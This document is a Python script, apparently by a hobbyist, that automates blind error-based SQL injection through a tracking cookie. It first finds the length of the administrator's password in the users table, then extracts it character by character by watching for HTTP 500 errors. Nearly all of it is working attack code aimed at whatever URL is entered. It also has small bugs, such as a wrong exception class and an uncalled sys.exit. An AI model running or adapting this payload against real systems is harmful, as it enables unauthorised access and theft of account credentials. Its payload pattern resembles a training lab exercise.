from logging import exception
import requests
import os
import sys
os.system("clear")
def main(url):
    try:
        ResponseTrack=requests.get(url)
        TrackId=ResponseTrack.headers.get("Set-Cookie").split(";")[0].split("=")[1]
        for i in range(1,50):
            cookie={'TrackingId':str(TrackId)+"'+||+(select+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator'+and+LENGTH(password)="+str(i)+")+||+'"}
            response=requests.get(url,cookies=cookie)
            if response.status_code==500:
                password = i
                break
        print("password :"+str(password))
        password=""
        char="1234567890qwertyuiopasdfghjklmnbvcxz"
        for i in range(1,21):
            for j in char:
                cookie={'TrackingId':str(TrackId)+"+'+||+(select+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator'+and+substr(password,"+str(i)+",1)='"+j+"')+||+'"}
                response=requests.get(url,cookies=cookie)
                if response.status_code==500:
                        password +=j
                        print(f"{[i]}==>{[j]} found")
        print("password : adminisrator")         
        print("password :"+str(password))
    except exception:
        print("!! error check the url and try again")
        sys.exit
print("""+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
         + Author : MEKUROKO007                                  +
         + github : https://github.com/MEKuroko007               +
         +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        """)

url=input("enter the url : ")
if __name__=='__main__':
    main(url)
